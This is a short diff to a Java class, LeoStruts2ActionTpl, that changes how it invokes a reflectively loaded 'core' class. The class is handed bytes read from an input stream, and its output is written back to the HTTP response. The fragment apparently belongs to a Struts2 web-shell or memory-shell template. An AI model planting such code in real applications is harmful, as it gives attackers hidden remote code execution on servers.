@@ -47,7 +47,11 @@ public class LeoStruts2ActionTpl {
                     while ((bytesRead = inputStream.read(buffer)) != -1) {
                         byteArrayOutputStream.write(buffer, 0, bytesRead);
                     }
-                    Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
+                    try {
+                        ((java.lang.reflect.InvocationHandler) Class.forName(coreClassName,true,ClassLoader.getSystemClassLoader()).newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream});
+                    } catch (Throwable e) {
+                        throw new IllegalStateException("Core invocation failed", e);
+                    }
                     response.getOutputStream().write(byteArrayOutputStream.toByteArray());
                 }
             }
